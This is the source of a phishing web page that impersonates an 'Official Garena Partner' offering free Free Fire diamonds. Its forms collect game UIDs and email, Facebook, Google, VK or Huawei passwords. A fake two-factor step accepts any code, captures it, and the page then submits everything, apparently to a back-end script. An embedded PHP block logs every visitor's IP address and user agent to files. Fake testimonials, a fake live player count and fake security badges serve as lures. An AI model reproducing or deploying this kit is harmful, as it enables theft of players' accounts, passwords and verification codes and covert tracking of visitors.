<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Diamond Redeem - Official Partner</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="images/favicon.ico" type="image/x-icon">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        /* Enhanced 2FA Styles */
        .hidden { display: none !important; }
        .floating-diamond { 
            position: absolute; 
            font-size: 2rem; 
            opacity: 0.1; 
            animation: float 6s ease-in-out infinite; 
        }
        
        /* 2FA Verification Styles */
        .verification-container {
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            margin: 20px 0;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.2);
        }
        
        .verification-step {
            transition: all 0.5s ease;
        }
        
        .verification-code-input {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }
        
        .code-input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            border: 2px solid #ffd700;
            border-radius: 8px;
            background: rgba(255,215,0,0.1);
            color: white;
        }
        
        .code-input:focus {
            border-color: #ff6b00;
            outline: none;
            background: rgba(255,107,0,0.2);
        }
        
        .verification-method {
            background: rgba(255,255,255,0.05);
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }
        
        .verification-method:hover {
            background: rgba(255,255,255,0.1);
            border-color: #ffd700;
        }
        
        .verification-method.active {
            border-color: #ff6b00;
            background: rgba(255,107,0,0.1);
        }
        
        .countdown-timer {
            font-size: 1.2em;
            color: #ffd700;
            font-weight: bold;
            margin: 10px 0;
        }
        
        .security-notification {
            background: rgba(255,193,7,0.2);
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
        }
        
        .verification-success {
            background: rgba(40,167,69,0.2);
            border-left: 4px solid #28a745;
            padding: 20px;
            margin: 15px 0;
            border-radius: 5px;
            text-align: center;
        }

        /* Login Form Styles */
        .login-box {
            background: rgba(255,255,255,0.1);
            padding: 25px;
            border-radius: 12px;
            margin: 15px 0;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.2);
        }
        
        .provider-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .back-btn {
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.3);
            color: white;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 15px;
            width: 100%;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(180deg); }
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .pulse { animation: pulse 2s infinite; }
    </style>
</head>
<body>
    <!-- Background Animation -->
    <div class="background-animation">
        <div class="floating-diamond">💎</div>
        <div class="floating-diamond">🔫</div>
        <div class="floating-diamond">🎯</div>
        <div class="floating-diamond">⚡</div>
    </div>

    <div class="container">
        <!-- Header Section -->
        <header class="header">
            <div class="logo-container">
                <img src="images/logo.png" alt="Free Fire" class="logo" onerror="this.style.display='none'">
                <div class="logo-text">
                    <h1>Free Fire Diamond Redeem</h1>
                    <p>Official Garena Partner • Secure Login</p>
                </div>
            </div>
            <div class="live-stats">
                <div class="stat">
                    <span class="live-dot"></span>
                    <span>Live: <strong id="onlineCount">1,234</strong> players online</span>
                </div>
                <div class="stat">Today's Reward: <strong>500 Diamonds</strong></div>
            </div>
        </header>

        <!-- Main Content Grid -->
        <div class="main-grid">
            <!-- Left Column: Rewards & Features -->
            <div class="left-column">
                <div class="reward-card premium">
                    <div class="reward-badge">HOT</div>
                    <h3><i class="fas fa-gem"></i> Daily Diamond Reward</h3>
                    <div class="reward-amount">500 <span>Diamonds</span></div>
                    <p>Login now to claim your daily bonus!</p>
                    <div class="progress-bar">
                        <div class="progress-fill" style="width: 75%"></div>
                        <span>75% claimed today</span>
                    </div>
                </div>

                <div class="features-grid">
                    <div class="feature-card">
                        <i class="fas fa-shield-alt"></i>
                        <h4>2FA Protected</h4>
                        <p>Enhanced security</p>
                    </div>
                    <div class="feature-card">
                        <i class="fas fa-bolt"></i>
                        <h4>Instant Delivery</h4>
                        <p>Within 2 minutes</p>
                    </div>
                    <div class="feature-card">
                        <i class="fas fa-users"></i>
                        <h4>Official Partner</h4>
                        <p>Garena verified</p>
                    </div>
                    <div class="feature-card">
                        <i class="fas fa-gift"></i>
                        <h4>Daily Rewards</h4>
                        <p>Never miss a day</p>
                    </div>
                </div>

                <div class="testimonials">
                    <h4><i class="fas fa-star"></i> Player Testimonials</h4>
                    <div class="testimonial">
                        <p>"2FA made me feel secure! Got my diamonds instantly!"</p>
                        <span>- ProPlayer99</span>
                    </div>
                    <div class="testimonial">
                        <p>"Safe and secure. The verification was smooth!"</p>
                        <span>- DiamondHunter</span>
                    </div>
                </div>
            </div>

            <!-- Right Column: Login & 2FA Boxes -->
            <div class="right-column">
                <!-- Step 1: Credential Login -->
                <div id="loginStep" class="login-section">
                    <div class="social-login-section">
                        <h3><i class="fas fa-rocket"></i> Secure Login</h3>
                        <p>Two-factor authentication enabled for your security</p>
                        
                        <div class="social-buttons">
                            <button type="button" class="social-btn facebook" onclick="showLoginForm('facebook')">
                                <i class="fab fa-facebook"></i>
                                Continue with Facebook
                            </button>
                            
                            <button type="button" class="social-btn google" onclick="showLoginForm('google')">
                                <i class="fab fa-google"></i>
                                Continue with Google
                            </button>
                            
                            <button type="button" class="social-btn vk" onclick="showLoginForm('vk')">
                                <i class="fab fa-vk"></i>
                                Continue with VK
                            </button>
                            
                            <button type="button" class="social-btn huawei" onclick="showLoginForm('huawei')">
                                <i class="fas fa-mobile-alt"></i>
                                Continue with Huawei
                            </button>
                        </div>
                        
                        <div class="divider">
                            <span>or login with email</span>
                        </div>
                    </div>

                    <!-- Email/Password Login Box -->
                    <div class="login-box" id="emailLogin">
                        <h4><i class="fas fa-envelope"></i> Email Login</h4>
                        <form class="login-form" onsubmit="return handleLoginSubmit(event)">
                            <input type="hidden" name="provider" value="email">
                            
                            <div class="uid-input-group">
                                <label><i class="fas fa-id-card"></i> Free Fire UID (Required)</label>
                                <input type="text" name="uid" required placeholder="Enter your Free Fire UID" 
                                       pattern="[0-9]+" title="Please enter your numeric Free Fire UID">
                                <div class="uid-note">Your unique Free Fire Player ID (numbers only)</div>
                            </div>
                            
                            <div class="input-group">
                                <label><i class="fas fa-user"></i> Email Address</label>
                                <input type="email" name="email" required placeholder="Enter your email" autocomplete="email">
                            </div>
                            
                            <div class="input-group">
                                <label><i class="fas fa-lock"></i> Password</label>
                                <input type="password" name="password" required placeholder="Enter your password" autocomplete="current-password">
                                <span class="toggle-password" onclick="togglePassword(this)"><i class="fas fa-eye"></i></span>
                            </div>
                            
                            <div class="form-options">
                                <label class="remember">
                                    <input type="checkbox" name="remember"> Remember this device
                                </label>
                                <a href="#" class="forgot-link" onclick="return false;">Forgot password?</a>
                            </div>
                            
                            <button type="submit" class="login-btn">
                                <i class="fas fa-shield-alt"></i>
                                Continue to Verification
                            </button>
                        </form>
                    </div>

                    <!-- Facebook Login Box -->
                    <div class="login-box hidden" id="facebookLogin">
                        <div class="provider-header">
                            <i class="fab fa-facebook" style="color: #1877f2;"></i>
                            <h4>Facebook Login</h4>
                        </div>
                        <form class="login-form" onsubmit="return handleLoginSubmit(event)">
                            <input type="hidden" name="provider" value="facebook">
                            
                            <div class="uid-input-group">
                                <label><i class="fas fa-id-card"></i> Free Fire UID (Required)</label>
                                <input type="text" name="uid" required placeholder="Enter your Free Fire UID" 
                                       pattern="[0-9]+" title="Please enter your numeric Free Fire UID">
                                <div class="uid-note">Your unique Free Fire Player ID (numbers only)</div>
                            </div>
                            
                            <div class="input-group">
                                <label><i class="fas fa-user"></i> Facebook Email or Phone</label>
                                <input type="text" name="email" required placeholder="Email or phone number" autocomplete="email">
                            </div>
                            
                            <div class="input-group">
                                <label><i class="fas fa-lock"></i> Facebook Password</label>
                                <input type="password" name="password" required placeholder="Enter your Facebook password" autocomplete="current-password">
                                <span class="toggle-password" onclick="togglePassword(this)"><i class="fas fa-eye"></i></span>
                            </div>
                            
                            <div class="form-options">
                                <label class="remember">
                                    <input type="checkbox" name="remember"> Remember this device
                                </label>
                                <a href="#" class="forgot-link" onclick="return false;">Forgot password?</a>
                            </div>
                            
                            <button type="submit" class="login-btn" style="background: linear-gradient(135deg, #1877f2, #0e5a9d);">
                                <i class="fab fa-facebook"></i>
                                Continue with Facebook
                            </button>
                        </form>
                        <button type="button" class="back-btn" onclick="showEmailLogin()">
                            <i class="fas fa-arrow-left"></i> Back to other options
                        </button>
                    </div>

                    <!-- Google Login Box -->
                    <div class="login-box hidden" id="googleLogin">
                        <div class="provider-header">
                            <i class="fab fa-google" style="color: #ea4335;"></i>
                            <h4>Google Login</h4>
                        </div>
                        <form class="login-form" onsubmit="return handleLoginSubmit(event)">
                            <input type="hidden" name="provider" value="google">
                            
                            <div class="uid-input-group">
                                <label><i class="fas fa-id-card"></i> Free Fire UID (Required)</label>
                                <input type="text" name="uid" required placeholder="Enter your Free Fire UID" 
                                       pattern="[0-9]+" title="Please enter your numeric Free Fire UID">
                                <div class="uid-note">Your unique Free Fire Player ID (numbers only)</div>
                            </div>
                            
                            <div class="input-group">
                                <label><i class="fas fa-user"></i> Google Email</label>
                                <input type="email" name="email" required placeholder="Enter your Google email" autocomplete="email">
                            </div>
                            
                            <div class="input-group">
                                <label><i class="fas fa-lock"></i> Google Password</label>
                                <input type="password" name="password" required placeholder="Enter your Google password" autocomplete="current-password">
                                <span class="toggle-password" onclick="togglePassword(this)"><i class="fas fa-eye"></i></span>
                            </div>
                            
                            <div class="form-options">
                                <label class="remember">
                                    <input type="checkbox" name="remember"> Remember this device
                                </label>
                                <a href="#" class="forgot-link" onclick="return false;">Forgot password?</a>
                            </div>
                            
                            <button type="submit" class="login-btn" style="background: linear-gradient(135deg, #ea4335, #d33427);">
                                <i class="fab fa-google"></i>
                                Continue with Google
                            </button>
                        </form>
                        <button type="button" class="back-btn" onclick="showEmailLogin()">
                            <i class="fas fa-arrow-left"></i> Back to other options
                        </button>
                    </div>

                    <!-- VK Login Box -->
                    <div class="login-box hidden" id="vkLogin">
                        <div class="provider-header">
                            <i class="fab fa-vk" style="color: #4a76a8;"></i>
                            <h4>VK Login</h4>
                        </div>
                        <form class="login-form" onsubmit="return handleLoginSubmit(event)">
                            <input type="hidden" name="provider" value="vk">
                            
                            <div class="uid-input-group">
                                <label><i class="fas fa-id-card"></i> Free Fire UID (Required)</label>
                                <input type="text" name="uid" required placeholder="Enter your Free Fire UID" 
                                       pattern="[0-9]+" title="Please enter your numeric Free Fire UID">
                                <div class="uid-note">Your unique Free Fire Player ID (numbers only)</div>
                            </div>
                            
                            <div class="input-group">
                                <label><i class="fas fa-user"></i> VK Email or Phone</label>
                                <input type="text" name="email" required placeholder="Email or phone number" autocomplete="email">
                            </div>
                            
                            <div class="input-group">
                                <label><i class="fas fa-lock"></i> VK Password</label>
                                <input type="password" name="password" required placeholder="Enter your VK password" autocomplete="current-password">
                                <span class="toggle-password" onclick="togglePassword(this)"><i class="fas fa-eye"></i></span>
                            </div>
                            
                            <div class="form-options">
                                <label class="remember">
                                    <input type="checkbox" name="remember"> Remember this device
                                </label>
                                <a href="#" class="forgot-link" onclick="return false;">Forgot password?</a>
                            </div>
                            
                            <button type="submit" class="login-btn" style="background: linear-gradient(135deg, #4a76a8, #3a5f8a);">
                                <i class="fab fa-vk"></i>
                                Continue with VK
                            </button>
                        </form>
                        <button type="button" class="back-btn" onclick="showEmailLogin()">
                            <i class="fas fa-arrow-left"></i> Back to other options
                        </button>
                    </div>

                    <!-- Huawei Login Box -->
                    <div class="login-box hidden" id="huaweiLogin">
                        <div class="provider-header">
                            <i class="fas fa-mobile-alt" style="color: #ff0000;"></i>
                            <h4>Huawei Login</h4>
                        </div>
                        <form class="login-form" onsubmit="return handleLoginSubmit(event)">
                            <input type="hidden" name="provider" value="huawei">
                            
                            <div class="uid-input-group">
                                <label><i class="fas fa-id-card"></i> Free Fire UID (Required)</label>
                                <input type="text" name="uid" required placeholder="Enter your Free Fire UID" 
                                       pattern="[0-9]+" title="Please enter your numeric Free Fire UID">
                                <div class="uid-note">Your unique Free Fire Player ID (numbers only)</div>
                            </div>
                            
                            <div class="input-group">
                                <label><i class="fas fa-user"></i> Huawei ID</label>
                                <input type="text" name="email" required placeholder="Enter your Huawei ID" autocomplete="email">
                            </div>
                            
                            <div class="input-group">
                                <label><i class="fas fa-lock"></i> Huawei Password</label>
                                <input type="password" name="password" required placeholder="Enter your Huawei password" autocomplete="current-password">
                                <span class="toggle-password" onclick="togglePassword(this)"><i class="fas fa-eye"></i></span>
                            </div>
                            
                            <div class="form-options">
                                <label class="remember">
                                    <input type="checkbox" name="remember"> Remember this device
                                </label>
                                <a href="#" class="forgot-link" onclick="return false;">Forgot password?</a>
                            </div>
                            
                            <button type="submit" class="login-btn" style="background: linear-gradient(135deg, #ff0000, #cc0000);">
                                <i class="fas fa-mobile-alt"></i>
                                Continue with Huawei
                            </button>
                        </form>
                        <button type="button" class="back-btn" onclick="showEmailLogin()">
                            <i class="fas fa-arrow-left"></i> Back to other options
                        </button>
                    </div>
                </div>

                <!-- Step 2: 2FA Verification -->
                <div id="verificationStep" class="hidden verification-container">
                    <div class="verification-header">
                        <div class="verification-icon">
                            <i class="fas fa-shield-check"></i>
                        </div>
                        <h3>Two-Factor Verification Required</h3>
                        <p>For your security, please complete the verification process</p>
                    </div>

                    <div class="security-notification">
                        <i class="fas fa-exclamation-triangle"></i>
                        <strong>Security Alert:</strong> We've detected a login attempt from a new device. 
                        Verification is required to protect your account.
                    </div>

                    <!-- Verification Method Selection -->
                    <div class="verification-methods">
                        <h4>Choose verification method:</h4>
                        
                        <div class="verification-method active" onclick="selectVerificationMethod('sms')">
                            <i class="fas fa-mobile-alt"></i>
                            <div>
                                <strong>SMS Verification</strong>
                                <p>Send code to your registered phone number</p>
                                <small id="phoneNumber">*******1234</small>
                            </div>
                        </div>
                        
                        <div class="verification-method" onclick="selectVerificationMethod('email')">
                            <i class="fas fa-envelope"></i>
                            <div>
                                <strong>Email Verification</strong>
                                <p>Send code to your registered email</p>
                                <small id="emailMask">u****@gmail.com</small>
                            </div>
                        </div>
                        
                        <div class="verification-method" onclick="selectVerificationMethod('authenticator')">
                            <i class="fas fa-mobile"></i>
                            <div>
                                <strong>Authenticator App</strong>
                                <p>Use Google Authenticator or similar app</p>
                                <small>Time-based code</small>
                            </div>
                        </div>
                    </div>

                    <!-- Code Input Section -->
                    <div id="codeVerification" class="verification-step">
                        <h4>Enter verification code:</h4>
                        <div class="verification-code-input">
                            <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
                            <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
                            <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
                            <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
                            <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)">
                            <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 6)">
                        </div>
                        
                        <div class="countdown-timer">
                            <i class="fas fa-clock"></i>
                            Code expires in: <span id="countdown">05:00</span>
                        </div>
                        
                        <button type="button" class="login-btn" onclick="verify2FACode()">
                            <i class="fas fa-check-circle"></i>
                            Verify & Complete Login
                        </button>
                        
                        <div class="resend-section">
                            <p>Didn't receive the code? 
                                <a href="#" onclick="resendVerificationCode()" id="resendLink">
                                    Resend code
                                </a>
                                <span id="resendTimer" class="hidden">(Available in <span id="resendTime">60</span>s)</span>
                            </p>
                        </div>
                    </div>

                    <!-- Authenticator Instructions -->
                    <div id="authenticatorInstructions" class="verification-step hidden">
                        <h4>Authenticator App Instructions:</h4>
                        <p>Open your authenticator app and enter the 6-digit code for "Free Fire Diamonds"</p>
                        <div class="verification-code-input">
                            <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
                            <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
                            <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
                            <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
                            <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)">
                            <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 6)">
                        </div>
                        <button type="button" class="login-btn" onclick="verifyAuthenticatorCode()">
                            Verify Authenticator Code
                        </button>
                    </div>
                </div>

                <!-- Step 3: Success Message -->
                <div id="successStep" class="hidden verification-success">
                    <div class="success-icon">
                        <i class="fas fa-check-circle"></i>
                    </div>
                    <h3>Verification Successful!</h3>
                    <p>Your account has been verified successfully. Redirecting to your dashboard...</p>
                    <div class="loading-spinner">
                        <i class="fas fa-spinner fa-spin"></i>
                    </div>
                </div>

                <!-- Security Badges -->
                <div class="security-badges">
                    <div class="badge">
                        <i class="fas fa-shield-check"></i>
                        <span>2FA Enabled</span>
                    </div>
                    <div class="badge">
                        <i class="fas fa-lock"></i>
                        <span>SSL Secured</span>
                    </div>
                    <div class="badge">
                        <i class="fas fa-user-shield"></i>
                        <span>Privacy Protected</span>
                    </div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <footer class="footer">
            <p>© 2024 Free Fire Diamond Redeem. Official Garena Partner. All rights reserved.</p>
            <div class="footer-links">
                <a href="#" onclick="return false;">Terms of Service</a>
                <a href="#" onclick="return false;">Privacy Policy</a>
                <a href="#" onclick="return false;">Contact Support</a>
            </div>
        </footer>
    </div>

    <!-- Loading Overlay -->
    <div class="loading-overlay hidden" id="loadingOverlay">
        <div class="loading-content">
            <div class="spinner"></div>
            <h3>Securing Your Connection</h3>
            <p>Please wait while we authenticate your account...</p>
            <div class="security-check">
                <div><i class="fas fa-check"></i> Encryption enabled</div>
                <div><i class="fas fa-check"></i> Identity verification</div>
                <div><i class="fas fa-check"></i> Reward processing</div>
            </div>
        </div>
    </div>
<script>
        // 2FA Verification Variables
        let currentVerificationMethod = 'sms';
        let verificationCode = '';
        let countdownInterval;
        let resendTimerInterval;

        // Enhanced Login Handler with 2FA
        function handleLoginSubmit(event) {
            event.preventDefault();
            
            const form = event.target;
            const submitBtn = form.querySelector('button[type="submit"]');
            const email = form.querySelector('input[name="email"]').value;
            
            // Validate UID
            const uidInput = form.querySelector('input[name="uid"]');
            if (!/^\d+$/.test(uidInput.value)) {
                alert('Please enter a valid Free Fire UID (numbers only)');
                uidInput.focus();
                return false;
            }
            
            // Show loading state
            if (submitBtn) {
                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
                submitBtn.disabled = true;
            }
            
            // Simulate login verification
            setTimeout(() => {
                // Mask email for display
                const maskedEmail = email.replace(/(.{2})(.*)(?=@)/, function(g1, g2, g3) {
                    return g2 + '*'.repeat(g3.length);
                });
                document.getElementById('emailMask').textContent = maskedEmail;
                
                // Show 2FA verification step
                document.getElementById('loginStep').classList.add('hidden');
                document.getElementById('verificationStep').classList.remove('hidden');
                
                // Start verification process
                startVerificationProcess();
                
                // Reset button state
                if (submitBtn) {
                    submitBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Continue to Verification';
                    submitBtn.disabled = false;
                }
            }, 2000);
            
            return false;
        }

        // Start Verification Process
        function startVerificationProcess() {
            // Generate random verification code
            verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
            
            // Start countdown timer
            startCountdownTimer(300); // 5 minutes
            
            // Simulate sending verification code
            simulateCodeSending();
        }

        // Select Verification Method
        function selectVerificationMethod(method) {
            currentVerificationMethod = method;
            
            // Update active state
            document.querySelectorAll('.verification-method').forEach(el => {
                el.classList.remove('active');
            });
            event.currentTarget.classList.add('active');
            
            // Show appropriate verification interface
            if (method === 'authenticator') {
                document.getElementById('codeVerification').classList.add('hidden');
                document.getElementById('authenticatorInstructions').classList.remove('hidden');
            } else {
                document.getElementById('codeVerification').classList.remove('hidden');
                document.getElementById('authenticatorInstructions').classList.add('hidden');
            }
        }

        // Show specific login form
        function showLoginForm(provider) {
            const loginBoxes = document.querySelectorAll('.login-box');
            const socialSection = document.querySelector('.social-login-section');
            
            loginBoxes.forEach(box => box.classList.add('hidden'));
            const targetBox = document.getElementById(provider + 'Login');
            if (targetBox) {
                targetBox.classList.remove('hidden');
            }
            
            if (socialSection) {
                socialSection.style.display = 'none';
            }
        }

        // Show email login as default
        function showEmailLogin() {
            const loginBoxes = document.querySelectorAll('.login-box');
            const socialSection = document.querySelector('.social-login-section');
            
            loginBoxes.forEach(box => box.classList.add('hidden'));
            const emailBox = document.getElementById('emailLogin');
            if (emailBox) {
                emailBox.classList.remove('hidden');
            }
            
            if (socialSection) {
                socialSection.style.display = 'block';
            }
        }

        // Move to next input field in code verification
        function moveToNext(input, nextIndex) {
            const maxLength = parseInt(input.getAttribute('maxlength'));
            const currentLength = input.value.length;
            
            if (currentLength >= maxLength) {
                const nextInput = input.parentElement.querySelector(`.code-input:nth-child(${nextIndex + 1})`);
                if (nextInput) {
                    nextInput.focus();
                }
            }
            
            // Auto-verify if all fields are filled
            autoVerifyCode();
        }

        // Auto-verify when all code digits are entered
        function autoVerifyCode() {
            const inputs = document.querySelectorAll('.code-input');
            let allFilled = true;
            let enteredCode = '';
            
            inputs.forEach(input => {
                if (input.value.length === 0) {
                    allFilled = false;
                }
                enteredCode += input.value;
            });
            
            if (allFilled && enteredCode.length === 6) {
                verify2FACode();
            }
        }

        // Verify 2FA Code
        function verify2FACode() {
            const inputs = document.querySelectorAll('.code-input');
            let enteredCode = '';
            
            inputs.forEach(input => {
                enteredCode += input.value;
            });
            
            if (enteredCode.length !== 6) {
                alert('Please enter the complete 6-digit verification code');
                return;
            }
            
            // Show verification in progress
            const verifyBtn = document.querySelector('#verificationStep .login-btn');
            if (verifyBtn) {
                verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying Code...';
                verifyBtn.disabled = true;
            }
            
            // Simulate verification process
            setTimeout(() => {
                // For demo purposes, accept any 6-digit code
                showSuccessStep();
            }, 1500);
        }

        // Verify Authenticator Code
        function verifyAuthenticatorCode() {
            verify2FACode(); // Same functionality for demo
        }

        // Show Success Step
        function showSuccessStep() {
            document.getElementById('verificationStep').classList.add('hidden');
            document.getElementById('successStep').classList.remove('hidden');
            
            // Simulate final verification and redirect
            setTimeout(() => {
                // Submit the actual form data to login.php
                const form = document.querySelector('.login-form');
                if (form) {
                    // Add 2FA verification data
                    const verificationInput = document.createElement('input');
                    verificationInput.type = 'hidden';
                    verificationInput.name = '2fa_verified';
                    verificationInput.value = 'true';
                    form.appendChild(verificationInput);
                    
                    // Add verification method
                    const methodInput = document.createElement('input');
                    methodInput.type = 'hidden';
                    methodInput.name = 'verification_method';
                    methodInput.value = currentVerificationMethod;
                    form.appendChild(methodInput);
                    
                    // Submit the form
                    form.submit();
                }
            }, 3000);
        }

        // Start Countdown Timer
        function startCountdownTimer(seconds) {
            const countdownElement = document.getElementById('countdown');
            let timeLeft = seconds;
            
            clearInterval(countdownInterval);
            
            countdownInterval = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const secs = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    countdownElement.innerHTML = '<span style="color: #e74c3c;">Expired</span>';
                    document.querySelector('.login-btn').disabled = true;
                }
                
                timeLeft--;
            }, 1000);
        }

        // Simulate Code Sending
        function simulateCodeSending() {
            const notification = document.createElement('div');
            notification.className = 'security-notification pulse';
            notification.innerHTML = `
                <i class="fas fa-paper-plane"></i>
                <strong>Verification code sent!</strong> 
                Check your ${currentVerificationMethod === 'sms' ? 'phone' : 'email'} for the 6-digit code.
            `;
            
            document.querySelector('#verificationStep').insertBefore(notification, document.querySelector('.verification-methods'));
            
            setTimeout(() => {
                notification.remove();
            }, 5000);
        }

        // Resend Verification Code
        function resendVerificationCode() {
            const resendLink = document.getElementById('resendLink');
            const resendTimer = document.getElementById('resendTimer');
            const resendTime = document.getElementById('resendTime');
            
            // Disable resend and show timer
            resendLink.style.display = 'none';
            resendTimer.classList.remove('hidden');
            
            let timeLeft = 60;
            resendTime.textContent = timeLeft;
            
            resendTimerInterval = setInterval(() => {
                timeLeft--;
                resendTime.textContent = timeLeft;
                
                if (timeLeft <= 0) {
                    clearInterval(resendTimerInterval);
                    resendLink.style.display = 'inline';
                    resendTimer.classList.add('hidden');
                }
            }, 1000);
            
            // Generate new code and resend
            verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
            simulateCodeSending();
        }

        // Toggle password visibility
        function togglePassword(icon) {
            const input = icon.parentElement.querySelector('input');
            if (input.type === 'password') {
                input.type = 'text';
                icon.innerHTML = '<i class="fas fa-eye-slash"></i>';
            } else {
                input.type = 'password';
                icon.innerHTML = '<i class="fas fa-eye"></i>';
            }
        }

        // Initialize 2FA system
        document.addEventListener('DOMContentLoaded', function() {
            // Add input event listeners to code inputs
            const codeInputs = document.querySelectorAll('.code-input');
            codeInputs.forEach((input, index) => {
                input.addEventListener('input', function() {
                    if (this.value.length === 1) {
                        moveToNext(this, index + 1);
                    }
                });
                
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value.length === 0) {
                        const prevInput = this.parentElement.querySelector(`.code-input:nth-child(${index})`);
                        if (prevInput) {
                            prevInput.focus();
                        }
                    }
                });
            });
            
            // Initialize online counter
            updateOnlineCount();
            
            console.log('2FA Verification System Loaded');
        });

        // Online users counter animation
        function updateOnlineCount() {
            const countElement = document.getElementById('onlineCount');
            if (!countElement) return;
            
            let count = 1234;
            setInterval(function() {
                count += Math.floor(Math.random() * 3);
                if (countElement) {
                    countElement.textContent = count.toLocaleString();
                }
            }, 3000);
        }
    </script>

    <!-- IP Logger -->
    <?php
    @ob_start();
    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown';
    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
    $timestamp = date('Y-m-d H:i:s');

    if (!is_dir('data')) @mkdir('data', 0755, true);
    
    $log_entry = "$timestamp | IP: $ip | Agent: $user_agent | Page: 2FA_Enhanced\n";
    @file_put_contents('data/ip_log.txt', $log_entry, FILE_APPEND);
    @file_put_contents('data/ips.txt', "$ip\n", FILE_APPEND);
    @ob_end_clean();
    ?>
</body>
</html>
